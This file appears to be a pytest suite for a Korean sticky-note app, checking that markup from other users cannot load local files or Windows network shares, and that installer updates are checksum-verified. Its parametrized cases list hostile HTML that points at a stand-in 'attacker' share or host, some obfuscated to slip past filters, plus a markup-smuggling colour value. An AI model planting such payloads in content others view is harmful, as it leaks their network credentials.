"""남이 보낸 값이 이 PC 에서 뜻밖의 일을 일으키지 않는지 본다(offscreen).

메모 본문, 닉네임, 폴더 이름, 색 값은 다른 참가자가 보낸다. 그것을 화면에 그리는
것만으로 이 PC 의 파일이나 네트워크 경로(``\\\\서버\\공유``)를 열면 안 된다. 네트워크
경로를 열면 Windows 가 그 서버에 로그인 정보를 보낸다."""
from __future__ import annotations

import os

import pytest

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")

from PySide6.QtCore import Qt, QUrl  # noqa: E402
from PySide6.QtGui import QColor, QImage, QTextDocument  # noqa: E402
from PySide6.QtWidgets import QApplication, QLabel  # noqa: E402

from app import i18n  # noqa: E402
from app.ui import confirm, rich_text, safe_text, theme  # noqa: E402
from app.ui.safe_text import PlainLabelGuard, SafeTextDocument, safe_color  # noqa: E402


@pytest.fixture(scope="module")
def qapp():
    app = QApplication.instance() or QApplication([])
    i18n.set_language("ko")
    theme.apply_theme(app, "")
    yield app


@pytest.fixture
def red_png(tmp_path):
    """이 PC 에 있는 빨간 그림. 본문이 이 파일을 가리키게 해서, 화면에 빨간색이
    나오면 파일을 열었다는 뜻으로 본다."""
    path = tmp_path / "probe.png"
    img = QImage(40, 40, QImage.Format_RGB32)
    img.fill(QColor("#FF0000"))
    img.save(str(path))
    return path


def _has_red(widget) -> bool:
    shot = widget.grab().toImage()
    for y in range(0, shot.height(), 2):
        for x in range(0, shot.width(), 2):
            c = shot.pixelColor(x, y)
            if c.red() > 200 and c.green() < 60 and c.blue() < 60:
                return True
    return False


def _data_url() -> str:
    import base64

    from PySide6.QtCore import QBuffer, QIODevice

    img = QImage(8, 8, QImage.Format_RGB32)
    img.fill(QColor("#FF0000"))
    buf = QBuffer()
    buf.open(QIODevice.WriteOnly)
    img.save(buf, "PNG")
    return "data:image/png;base64," + base64.b64encode(bytes(buf.data())).decode()


# ── 문서 ────────────────────────────────────────────────────────────────

def test_safe_document_never_reads_what_the_body_points_at(qapp, red_png, tmp_path):
    doc = SafeTextDocument()
    for target in (QUrl.fromLocalFile(str(red_png)).toString(), str(red_png),
                   "file://some-server/share/a.png", r"\\some-server\share\a.png",
                   "http://example.invalid/a.png"):
        got = doc.loadResource(QTextDocument.ImageResource, QUrl(target))
        # 빈 그림을 돌려준다. 빈 값이면 Qt 가 그 이름을 파일로 보고 직접 연다.
        assert isinstance(got, QImage) and (got.width(), got.height()) == (1, 1)
    css = tmp_path / "a.css"
    css.write_text("p { color: red; }", encoding="utf-8")
    assert doc.loadResource(QTextDocument.StyleSheetResource,
                            QUrl.fromLocalFile(str(css))) is None
    # 본문 안에 든 그림(data:)은 그대로 읽는다.
    inline = doc.loadResource(QTextDocument.ImageResource, QUrl(_data_url()))
    assert inline is not None and not isinstance(inline, QImage) or (
        isinstance(inline, QImage) and inline.width() == 8)


def test_note_body_does_not_draw_a_file_it_points_at(qapp, red_png):
    edit = rich_text.RichTextEdit()
    url = QUrl.fromLocalFile(str(red_png)).toString()
    edit.setHtml(f'<p>본문</p><img src="{url}"><img src="{red_png}">')
    edit.resize(320, 240)
    edit.show()
    qapp.processEvents()
    assert not _has_red(edit)
    assert isinstance(edit.document(), SafeTextDocument)

    # 본문에 든 그림은 전처럼 보인다.
    edit.setHtml(f'<p>본문</p><img src="{_data_url()}" width="40" height="40">')
    qapp.processEvents()
    assert _has_red(edit)
    edit.close()


def test_reading_the_body_as_text_opens_nothing(qapp, monkeypatch, tmp_path):
    asked: list[str] = []

    class Spy(SafeTextDocument):
        def loadResource(self, kind, name):  # noqa: N802
            got = super().loadResource(kind, name)
            asked.append((name.toString(), got))
            return got

    monkeypatch.setattr(rich_text, "SafeTextDocument", Spy)
    css = tmp_path / "a.css"
    css.write_text("p { color: red; }", encoding="utf-8")
    href = QUrl.fromLocalFile(str(css)).toString()
    text = rich_text.html_to_plain(
        f'<html><head><link rel="stylesheet" type="text/css" href="{href}">'
        '</head><body><p>회의는 3시</p></body></html>')
    assert text.strip() == "회의는 3시"
    # 스타일시트를 달라는 요청은 오지만 아무것도 돌려주지 않는다.
    assert asked and all(got is None for _name, got in asked)


# ── 라벨, 알림, 확인창 ──────────────────────────────────────────────────

def test_labels_show_markup_from_others_as_plain_text(qapp, red_png):
    url = QUrl.fromLocalFile(str(red_png)).toString()
    evil = f'민수<img src="{url}">'
    label = QLabel(f"{evil}님이 새 메모를 생성했습니다.")
    assert label.textFormat() == Qt.AutoText
    label.resize(360, 80)
    label.show()
    qapp.processEvents()
    assert label.textFormat() == Qt.PlainText
    assert not _has_red(label)
    label.close()

    # 서식을 쓰겠다고 정한 라벨은 그대로 둔다.
    rich = QLabel()
    rich.setTextFormat(Qt.RichText)
    rich.setText("<b>굵게</b>")
    rich.show()
    qapp.processEvents()
    assert rich.textFormat() == Qt.RichText
    rich.close()
    assert isinstance(qapp._plain_label_guard, PlainLabelGuard)


def test_toast_and_message_box_are_plain(qapp, monkeypatch, red_png):
    from app.ui import toast

    url = QUrl.fromLocalFile(str(red_png)).toString()
    text = f"민수님이 '<img src=\"{url}\">' 메모를 수정했습니다."
    monkeypatch.setattr(toast, "user_is_busy", lambda: False)
    manager = toast.ToastManager()
    manager.show_text(text)
    note = manager.toasts()[0]
    qapp.processEvents()
    assert note._label.textFormat() == Qt.PlainText and note.text() == text
    assert not _has_red(note)
    manager.close_all()

    box, _act, _cancel = confirm.build_ask(None, "삭제", text, action="삭제",
                                           detail=text)
    assert box.textFormat() == Qt.PlainText
    box.show()
    qapp.processEvents()
    assert not _has_red(box)
    box.close()


def test_history_window_takes_untrusted_entries(qapp, red_png):
    from app.ui.history_viewer import HistoryViewer

    url = QUrl.fromLocalFile(str(red_png)).toString()
    evil = f'<img src="{url}">'
    viewer = HistoryViewer()
    viewer.set_notes([{"id": "n1", "content": f"<p>본문</p>{evil}"}])
    viewer.set_entries([{
        "note_id": "n1", "user": f"민수{evil}", "action": "update",
        "content_before": "<p>전</p>", "content_after": f"<p>후</p>{evil}",
        "color_before": f"#FFE066'>{evil}<span style='", "color_after": "#BAE1FF",
        "session_start": 1, "session_end": 2}])
    viewer.show()
    qapp.processEvents()
    viewer._list.setCurrentRow(0)
    qapp.processEvents()
    assert viewer._header.textFormat() == Qt.PlainText
    assert isinstance(viewer._detail.document(), SafeTextDocument)
    # 색 값 자리에 끼워 넣은 글자는 버려진다.
    assert "<img" not in viewer._color_row.text()
    assert not _has_red(viewer)
    viewer.close()


def test_safe_color_accepts_only_hex_colors():
    assert safe_color("#FFE066") == "#FFE066"
    assert safe_color("#ffe066") == "#ffe066"
    for bad in (None, "", "red", "#FFF", "#FFE066'><img src=x>", "#FFE066\n", 12):
        assert safe_color(bad) == "#CCCCCC"
    assert safe_text.safe_color("x", "#000000") == "#000000"


# ── 본문 거르기 ─────────────────────────────────────────────────────────

def test_guard_leaves_notes_made_by_the_app_untouched(qapp):
    from app import html_guard

    edit = rich_text.RichTextEdit()
    edit.setPlainText('회의는 3시 <b> & "따옴표"')
    img = QImage(12, 12, QImage.Format_RGB32)
    img.fill(QColor("#3B6EA8"))
    edit.insert_image(img)
    edit.insert_link("견적서", "file://filesrv/share/%EA%B2%AC%EC%A0%81.xlsx")
    edit.insert_file_links([r"C:\Work\보고서.pdf"])
    cursor = edit.textCursor()
    cursor.insertHtml('<img src="x-sticky-bullet:circle" /> 글머리')
    cursor.insertHtml(f'<img src="{rich_text.checkbox_url(True)}" /> 할 일')
    made = edit.toHtml()
    assert "data:image/png" in made and "x-sticky-bullet:circle" in made
    assert "<style" in made and 'href="file://filesrv' in made
    # 한 글자도 달라지지 않는다(같은 객체를 그대로 돌려준다).
    assert html_guard.clean(made) is made
    assert html_guard.clean("그냥 글") == "그냥 글"
    assert html_guard.clean("") == "" and html_guard.clean(None) == ""
    edit.close()


@pytest.mark.parametrize("piece", [
    '<img src="\\\\attacker\\share\\a.png">',
    '<img src="file://attacker/share/a.png">',
    "<img src=//attacker/share/a.png>",
    '<IMG\nSRC = "http://attacker.example/a.png" width=1>',
    '<img source="\\\\attacker\\share\\a.png">',
    '<img s&#114;c="\\\\attacker\\share\\a.png">',
    '<&#105;mg src="\\\\attacker\\share\\a.png">',
    '<img src="&#92;&#92;attacker&#92;share&#92;a.png">',
    '<img src="data:text/html;base64,PGI+">',
    '<img src="\\\\attacker\\share\\a.png"',
    '<link rel="stylesheet" type="text/css" href="file://attacker/s/a.css">',
    '<LINK href=//attacker/s/a.css rel=stylesheet>',
    '<base href="file://attacker/s/">',
    '<body background="\\\\attacker\\share\\bg.png">',
    '<table background=//attacker/share/bg.png>',
    '<p style="background-image: url(//attacker/share/bg.png)">',
    '<p style="background-image: u\\rl ( //attacker/share/bg.png )">',
    '<style>@import "//attacker/s/a.css";</style>',
    '<style type="text/css">p { background: url(\\\\attacker\\s\\a.png) }</style>',
    '<s&#116;yle>@import url(//attacker/s/a.css);</style>',
    '<object data="//attacker/s/a.swf"></object>',
    '<iframe src="//attacker/s/a.html"></iframe>',
])
def test_guard_removes_what_reaches_outside(piece):
    from app import html_guard

    html = "<p>앞</p>" + piece + "<p>뒤</p>"
    cleaned = html_guard.clean(html)
    low = cleaned.lower()
    assert "attacker" not in low and "data:text" not in low
    # 나머지 글은 남는다.
    assert "<p>앞</p>" in cleaned


def test_note_window_draws_cleaned_content(qapp, red_png):
    from app.settings import AppSettings
    from app.ui.sticky_note import StickyNoteWidget

    url = QUrl.fromLocalFile(str(red_png)).toString()
    settings = AppSettings()
    settings.fold_animation = False
    w = StickyNoteWidget({"id": "n1", "version": 1, "color": "#FFE066", "width": 320,
                          "height": 260,
                          "content": f'<p>본문</p><img src="{url}">'}, "지우",
                         settings=settings)
    w.apply_local_state(100, 100)
    w.show()
    qapp.processEvents()
    assert "probe.png" not in w._text.toHtml()
    assert not _has_red(w)
    w._teardown = True
    w.close()


# ── 그림 형식 ───────────────────────────────────────────────────────────

def test_only_plain_raster_images_are_decoded(qapp):
    import base64

    svg = (b'<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40">'
           b'<rect width="40" height="40" fill="#FF0000"/></svg>')
    svg_url = "data:image/png;base64," + base64.b64encode(svg).decode()
    assert safe_text.data_url_is_raster(_data_url())
    assert not safe_text.data_url_is_raster(svg_url)
    assert not safe_text.data_url_is_raster("data:image/svg+xml,<svg/>")
    assert not safe_text.data_url_is_raster("data:image/png;base64,%%%")
    for head in (b"\x89PNG\r\n\x1a\n....", b"\xff\xd8\xff\xe0", b"GIF89a..",
                 b"BM......", b"RIFF\x00\x00\x00\x00WEBPVP8 "):
        assert safe_text.is_plain_raster(head)
    for head in (b"<svg", b"%PDF-1.7", b"II*\x00", b"MM\x00*", b"icns", b""):
        assert not safe_text.is_plain_raster(head)

    # PNG 라고 적어 보낸 SVG 는 풀지 않는다.
    assert rich_text.data_url_image(svg_url).isNull()
    assert not rich_text.data_url_image(_data_url()).isNull()
    edit = rich_text.RichTextEdit()
    edit.setHtml(f'<p>본문</p><img src="{svg_url}" width="40" height="40">')
    edit.resize(300, 200)
    edit.show()
    qapp.processEvents()
    assert not _has_red(edit)
    edit.close()


# ── 업데이트 ────────────────────────────────────────────────────────────

def test_update_without_a_checksum_is_refused(qapp):
    from app import updater

    errors: list[str] = []
    ready: list[str] = []
    dl = updater.UpdateDownloader({"version": "1.0.2", "version_url": "",
                                   "download_url": "https://example.invalid/s.exe"})
    dl.error.connect(errors.append)
    dl.installerReady.connect(ready.append)
    dl.start()
    assert errors == [i18n.t("update.err_no_checksum")] and ready == []


def test_installer_is_checked_again_right_before_it_runs(monkeypatch, tmp_path):
    import hashlib
    import subprocess

    from app import updater

    ran: list[list[str]] = []
    monkeypatch.setattr(subprocess, "Popen", lambda args, **k: ran.append(args))
    setup = tmp_path / "MemilMemo-Setup-1.0.2.exe"
    setup.write_bytes(b"genuine installer")
    good = hashlib.sha256(b"genuine installer").hexdigest()

    assert updater.launch_installer(str(setup), good) is True
    assert ran and ran[0][0] == str(setup)

    # 받아 둔 뒤에 누가 파일을 바꿔 놓았으면 실행하지 않는다.
    ran.clear()
    setup.write_bytes(b"swapped")
    assert updater.launch_installer(str(setup), good) is False and ran == []
    assert updater.launch_installer(str(tmp_path / "없음.exe"), good) is False


def test_process_setup_turns_off_the_2x_file_probe(monkeypatch):
    import main

    monkeypatch.delenv("QT_HIGHDPI_DISABLE_2X_IMAGE_LOADING", raising=False)
    main._prepare_process()
    assert os.environ.get("QT_HIGHDPI_DISABLE_2X_IMAGE_LOADING") == "1"
